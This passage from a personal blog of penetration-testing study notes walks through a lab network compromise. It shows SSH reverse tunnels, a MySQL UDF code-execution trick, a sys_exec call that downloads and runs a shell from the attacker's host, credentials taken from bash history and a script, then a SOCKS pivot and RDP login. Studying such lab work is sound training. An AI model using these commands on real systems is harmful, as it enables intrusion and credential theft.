<p>to avoid the prompt for password, we generate ssh key on target machine </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBK2RDq8McGN6Av2gpVYvS6nwi6r10XFYVQsQAxQLDwaprw4pJObKgcpgXkgj48cSLCJ8473Jv3y8FUpqgN8sX3EJseG43ni45kP&#x2F;i3yQJ7sTmbG6&#x2F;ZsIdxZM4dC9oK9JbHTnko&#x2F;8d24lJMxAGwvskjFpCRjcBu1OVUmRziWFTG5v6zVaebvFt2DlP3XaDPZysZg4+Xh5iS+&#x2F;T73aarEJbLz5EEz7Nnq06bHvMOn&#x2F;hQqqiIZ6jgHVzSMu7eolt1hh7+CsCjaNctURir4JRCAMjEWmpQ+xy39b6PmqDLbJfKon68Xv685fB6d+O2vJr&#x2F;lO8KaKEnhEUwRw5GwN45hRT www-data@ajla</span><br></pre></td></tr></table></figure>

<p>in kali’s <code>authorized_keys</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from&#x3D;&quot;10.11.1.250&quot;,command&#x3D;&quot;echo &#39;This account can only be used for port forwarding&#39;&quot;,no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa</span><br><span class="line">AAAAB3NzaC1yc2EAAAADAQABAAABAQDBK2RDq8McGN6Av2gpVYvS6nwi6r10XFYVQsQAxQLDwaprw4pJObKgcpgXkgj48cSLCJ8473Jv3y8FUpqgN8sX3EJseG43ni45kP&#x2F;i3yQJ7sTmbG6&#x2F;ZsIdxZM4dC9oK9JbHTnko&#x2F;8d24lJMxAGwvskjFpCRjcBu1OVUmRziWFTG5v6zVaebvFt2DlP3XaDPZysZg4+Xh5iS+&#x2F;T73aarEJbLz5EEz7Nnq06bHvMOn&#x2F;hQqqiIZ6jgHVzSMu7eolt1hh7+CsCjaNctURir4JRCAMjEWmpQ+xy39b6PmqDLbJfKon68Xv685fB6d+O2vJr&#x2F;lO8KaKEnhEUwRw5GwN45hRT www-data@ajla</span><br></pre></td></tr></table></figure>

<p>in shell:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o &quot;UserKnownHostsFile&#x3D;&#x2F;dev&#x2F;null&quot; -o &quot;StrictHostKeyChecking&#x3D;no&quot; -i &#x2F;tmp&#x2F;keys&#x2F;id_rsa kali@192.168.119.165</span><br></pre></td></tr></table></figure>
<p><code>-f</code> run in background</p>
<h1 id="Targeting-the-database"><a href="#Targeting-the-database" class="headerlink" title="Targeting the database"></a>Targeting the database</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql --host&#x3D;127.0.0.1 --port&#x3D;13306 --user&#x3D;wp -p </span><br><span class="line">Lv9EVQq86cfi8ioWsqFUQyU</span><br></pre></td></tr></table></figure>

<p>look at what privilege we have:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SHOW Grants;</span><br><span class="line">GRANT USAGE ON *.* TO &#39;wp&#39;@&#39;%&#39; IDENTIFIED BY PASSWORD &#39;*61163AE4B131AB0E43F07BE7B&#39; |</span><br><span class="line">GRANT SELECT, INSERT, UPDATE, DELETE ON &#96;wordpress&#96;.* TO &#39;wp&#39;@&#39;%&#39;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; select @@hostname, @@tmpdir, @@version, @@version_compile_machine, @@plugin_dir;</span><br><span class="line">+------------+----------+-----------------+---------------------------+-------------------+</span><br><span class="line">| @@hostname | @@tmpdir | @@version       | @@version_compile_machine | @@plugin_dir      |</span><br><span class="line">+------------+----------+-----------------+---------------------------+-------------------+</span><br><span class="line">| zora       | &#x2F;var&#x2F;tmp | 10.3.20-MariaDB | x86_64                    | &#x2F;home&#x2F;dev&#x2F;plugin&#x2F; |</span><br><span class="line">+------------+----------+-----------------+---------------------------+-------------------+</span><br><span class="line">1 row in set (0.026 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit maria</span><br></pre></td></tr></table></figure>
<p>non of the exploit work for current version of maria</p>
<p>search for more generic <code>mysql</code> exploit, since maria is built on mysql</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit mysql</span><br></pre></td></tr></table></figure>

<p>UDF user-defined function show up often???? how did you get here?</p>
<p>find an interesting github repo:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;mysqludf&#x2F;lib_mysqludf_sys.git</span><br></pre></td></tr></table></figure>

<p>to compile, install some packages:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update &amp;&amp; sudo apt install default-libmysqlclient-dev libmariadbd-dev</span><br></pre></td></tr></table></figure>

<p>modify make file, to make it include maria’s header file. hmmmm..</p>
<p>output so to shellcode:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd -p lib_mysqludf_sys.so | tr -d &#39;\n&#39; &gt; lib_mysqludf_sys.so.hex</span><br></pre></td></tr></table></figure>

<p>tr -d delete;<br>xxd dump to hex</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mariadb&gt; set @shell&#x3D;0x7abf.....;</span><br><span class="line">select @@plugin_dir; </span><br><span class="line">select binary @shell into dumpfile &#39;&#x2F;home&#x2F;dev&#x2F;plugin&#x2F;udf_sys_exec.so&#39;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>We get error since wp does not have permission to write file  </p>
<p>go back to ajla to see if we can find root credentials</p>
<h1 id="Deeper-Enumeration-of-the-Web-Application-Server"><a href="#Deeper-Enumeration-of-the-Web-Application-Server" class="headerlink" title="Deeper Enumeration of the Web Application Server"></a>Deeper Enumeration of the Web Application Server</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit ubuntu 16.04</span><br></pre></td></tr></table></figure>

<p>find a good local privelege escalation script<br>compile locally and upload to ajla, we get the root</p>
<p>then we add our ssh pubkey to root</p>
<p>then we can ssh <code>root@sandbox.local</code> to the ajla</p>
<h2 id="search-for-DB-credentials"><a href="#search-for-DB-credentials" class="headerlink" title="search for DB credentials"></a>search for DB credentials</h2><p>inspect <code>.bash_history</code>, find:<br><code>mysql -u root -pBmDu9xUHKe3fZi3Z7RdMBeb -h 10.5.5.11 -e &#39;DROP DATABASE wordpress;&#39;</code>  </p>
<h1 id="Targeting-the-database-again"><a href="#Targeting-the-database-again" class="headerlink" title="Targeting the database again"></a>Targeting the database again</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql --host&#x3D;127.0.0.1 --port&#x3D;13306 --user&#x3D;root -pBmDu9xUHKe3fZi3Z7RdMBeb</span><br><span class="line">mariadb&gt; set @shell&#x3D;0x7abf.....;</span><br><span class="line">select @@plugin_dir; </span><br><span class="line">select binary @shell into dumpfile &#39;&#x2F;home&#x2F;dev&#x2F;plugin&#x2F;udf_sys_exec.so&#39;;</span><br><span class="line">create function sys_exec returns int soname &#39;udf_sys_exec.so&#39;;</span><br><span class="line">select * from mysql.func where name&#x3D;&#39;sys_exec&#39;;</span><br></pre></td></tr></table></figure>

<p>test to see if we can make network call from zora to kali</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali&gt; sudo python3 -m http.server 80</span><br></pre></td></tr></table></figure>
<p>let zora grab our shell.elf</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select sys_exec(&#39;wget http:&#x2F;&#x2F;192.168.119.165&#x2F;shell.elf&#39;);</span><br><span class="line">select sys_exec(&#39;chmod +x .&#x2F;shell.elf&#39;);</span><br></pre></td></tr></table></figure>

<p>make sure metasploit is ready for the connection</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">exit # exit root shell</span><br><span class="line">exit # exit shell</span><br><span class="line">exit</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">select sys_exec(&#39;.&#x2F;shell.elf&#39;);</span><br></pre></td></tr></table></figure>
<p>get the shell of mysql user</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;issue # get linux version</span><br><span class="line">Alpine Linux 3.10</span><br><span class="line"></span><br><span class="line">cat &#x2F;proc&#x2F;version # get kernel version</span><br><span class="line">Linux version 4.19.78-0-virt (buildozer@build-3-10-x86_64) (gcc version 8.3.0 (Alpine 8.3.0)) #1-Alpine SMP Thu Oct 10 15:25:30 UTC 2019</span><br><span class="line"></span><br><span class="line">uname -a</span><br><span class="line">linux zora 4.19.78-0-virt #1-Alpine SMP Thu Oct 10 15:25:30 UTC 2019 x86_64 Linux</span><br><span class="line"></span><br><span class="line">env</span><br><span class="line"></span><br><span class="line">ps ux</span><br><span class="line"></span><br><span class="line">netstat -tulpn</span><br><span class="line"></span><br><span class="line">cat &#x2F;etc&#x2F;fstab</span><br><span class="line"></span><br><span class="line">UUID&#x3D;ede2f74e-f23a-441c-b9cb-156494837ef3	&#x2F;	ext4	rw,relatime 0 1</span><br><span class="line">UUID&#x3D;8e53ca17-9437-4f54-953c-0093ce5066f2	&#x2F;boot	ext4	rw,relatime 0 2</span><br><span class="line">UUID&#x3D;ed8db3c1-a3c8-45fb-b5ec-f8e1529a8046	swap	swap	defaults	0 0</span><br><span class="line">&#x2F;dev&#x2F;cdrom	&#x2F;media&#x2F;cdrom	iso9660	noauto,ro 0 0</span><br><span class="line">&#x2F;dev&#x2F;usbdisk	&#x2F;media&#x2F;usb	vfat	noauto	0 0</span><br><span class="line">&#x2F;&#x2F;10.5.5.20&#x2F;Scripts    &#x2F;mnt&#x2F;scripts    cifs    uid&#x3D;0,gid&#x3D;0,username&#x3D;,password&#x3D;,_netdev 0 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>The contents of /etc/fstab are interesting. A share is mounted from the 10.5.5.20 host. Let’s poke<br>around the scripts share and see what we find.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;mnt&#x2F;scripts</span><br><span class="line"></span><br><span class="line">cat system_report.ps1</span><br><span class="line"># find a better way to automate this</span><br><span class="line">$username &#x3D; &quot;sandbox\alex&quot;</span><br><span class="line">$pwdTxt &#x3D; &quot;Ndawc*nRoqkC+haZ&quot;</span><br><span class="line">$securePwd &#x3D; $pwdTxt | ConvertTo-SecureString </span><br><span class="line">$credObject &#x3D; New-Object System.Management.Automation.PSCredential -ArgumentList $username, $securePwd</span><br><span class="line"></span><br><span class="line"># Enable remote management on Poultry</span><br><span class="line">$remoteKeyParams &#x3D; @&#123;</span><br><span class="line">ComputerName &#x3D; &quot;POULTRY&quot;</span><br><span class="line">Path &#x3D; &#39;HKLM:\SOFTWARE\Microsoft\WebManagement\Server&#39;</span><br><span class="line">Name &#x3D; &#39;EnableRemoteManagement&#39;</span><br><span class="line">Value &#x3D; &#39;1&#39; </span><br><span class="line">&#125;</span><br><span class="line">Set-RemoteRegistryValue @remoteKeyParams -Credential $credObject</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="Create-a-stable-reverse-tunnel"><a href="#Create-a-stable-reverse-tunnel" class="headerlink" title="Create a stable reverse tunnel"></a>Create a stable reverse tunnel</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen</span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;.ssh&#x2F;id_rsa</span><br><span class="line"></span><br><span class="line">from&#x3D;&quot;10.11.1.250&quot;,command&#x3D;&quot;echo &#39;This account can only be used for port</span><br><span class="line">forwarding&#39;&quot;,no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBVu1YocyTb1VTj7tkgBdqpqU&#x2F;YQoKSTEC3btRPoWDs8s4oCkYNU4nuehdUn8NFeBPSABqrPq7oBu20jJVD+BWdsXUVkTqCeQr4iz1owud1GsE7QbkHiWXmkNjLqzDTnJqL9Tp1cSdIx7Ekwc9ETtQlmAaR3YRA0Ryd2JR1Mv8edE43Fhh9LGVeW&#x2F;97hI6DeYOvA3+bODxd9hkqwnOyDqB5RzMEcu6q98sysp31QbiJ17LH1Rr5fkdUUmVZtdwlByu8heB5UrDW1UJUa0GoHmh&#x2F;nzwxD6+9eazK&#x2F;XNGp6&#x2F;pOPhd2zag99IMMtTkypx6mguFYy3mIgkI&#x2F;h5C46xJTOUz&#x2F;xQ2LwGb8+PWmBXHDcnbL85y4p1yyoUM5oBd+Fb6DThYnKmwVtvUb0VrEcN03JZ9QepkvdE84eUzqBdbWBjTzhgHTLFRJeMQM2sUt7vBcOB2XmuTk3md&#x2F;O8V7wQuSgXDk8vyz4h&#x2F;iSCu8UaLJx0CnJ5AdtIUeIBzgFWf1hJnWE&#x3D; mysql@zora</span><br></pre></td></tr></table></figure>

<h2 id="Dynamic-port-forwarding"><a href="#Dynamic-port-forwarding" class="headerlink" title="Dynamic port forwarding"></a>Dynamic port forwarding</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -f -N -R 1080 -o &quot;UserKnownHostsFile&#x3D;&#x2F;dev&#x2F;null&quot; -o &quot;StrictHostKeyChecking&#x3D;no&quot; -i &#x2F;var&#x2F;lib&#x2F;mysql&#x2F;.ssh&#x2F;id_rsa kali@192.168.119.165</span><br></pre></td></tr></table></figure>

<p>add to /etc/proxychains4.conf</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks4 127.0.0.1 1080</span><br></pre></td></tr></table></figure>

<h2 id="Targeting-Poultry"><a href="#Targeting-Poultry" class="headerlink" title="Targeting Poultry"></a>Targeting Poultry</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap --top-ports&#x3D;20 -sT -Pn 10.5.5.20</span><br><span class="line">PORT     STATE  SERVICE</span><br><span class="line">21&#x2F;tcp   closed ftp</span><br><span class="line">22&#x2F;tcp   closed ssh</span><br><span class="line">23&#x2F;tcp   closed telnet</span><br><span class="line">25&#x2F;tcp   closed smtp</span><br><span class="line">53&#x2F;tcp   closed domain</span><br><span class="line">80&#x2F;tcp   closed http</span><br><span class="line">110&#x2F;tcp  closed pop3</span><br><span class="line">111&#x2F;tcp  closed rpcbind</span><br><span class="line">135&#x2F;tcp  open   msrpc</span><br><span class="line">139&#x2F;tcp  open   netbios-ssn</span><br><span class="line">143&#x2F;tcp  closed imap</span><br><span class="line">443&#x2F;tcp  closed https</span><br><span class="line">445&#x2F;tcp  open   microsoft-ds</span><br><span class="line">993&#x2F;tcp  closed imaps</span><br><span class="line">995&#x2F;tcp  closed pop3s</span><br><span class="line">1723&#x2F;tcp closed pptp</span><br><span class="line">3306&#x2F;tcp closed mysql</span><br><span class="line">3389&#x2F;tcp open   ms-wbt-server</span><br><span class="line">5900&#x2F;tcp closed vnc</span><br><span class="line">8080&#x2F;tcp closed http-proxy</span><br></pre></td></tr></table></figure>
<p>-sT TCP connect<br>-Pn no ping</p>
<p>port <code>3389</code> <code>ms-wbt-server</code> is the rdp server  </p>
<p>login with the credential we have</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains xfreerdp &#x2F;d:sandbox &#x2F;u:alex &#x2F;v:10.5.5.20 +clipboard</span><br></pre></td></tr></table></figure>
<p>/d: domain<br>/u: user<br>/v: server host</p>
<p>let me try rdesktop first</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains rdesktop 10.5.5.20 -d sandbox -u alex -p &#39;Ndawc*nRoqkC+haZ&#39; -g 1024x768 -r clipboard:PRIMARYCLIPBOARD</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\alex&gt;systeminfo</span><br><span class="line">Host Name: POULTRY</span><br><span class="line">OS Name: Microsoft Windows 7 Professional</span><br><span class="line">OS Version: 6.1.7601 Service Pack 1 Build 7601</span><br><span class="line">...</span><br><span class="line">Registered Owner: poultryadmin</span><br><span class="line">...</span><br><span class="line">Domain: sandbox.local</span><br><span class="line"></span><br><span class="line">netstat -ano</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>nothing interesting for the opening port, Ports 49152 and above<br>are the Windows default dynamic/ephemeral ports for establishing TCP connections and we<br>don’t need to worry about them</p>
<p>check if alex is in admin group</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Global Group memberships *Domain Users</span><br></pre></td></tr></table></figure>
<p>it is a regular domain user</p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Gavin Cui</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://gavincrz.github.io/2021/07/11/Study-Notes-2021-07-11/">https://gavincrz.github.io/2021/07/11/Study-Notes-2021-07-11/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Study-Notes/">Study Notes</a><a class="post-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2021/07/11/OSCP-Exam-Tips/"><i class="fa fa-chevron-left">  </i><span>OSCP Exam Tips</span></a></div><div class="next-post pull-right"><a href="/2021/07/09/Study-Notes-2021-07-08/"><span>Study Notes - 2021/07/08</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By Gavin Cui</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>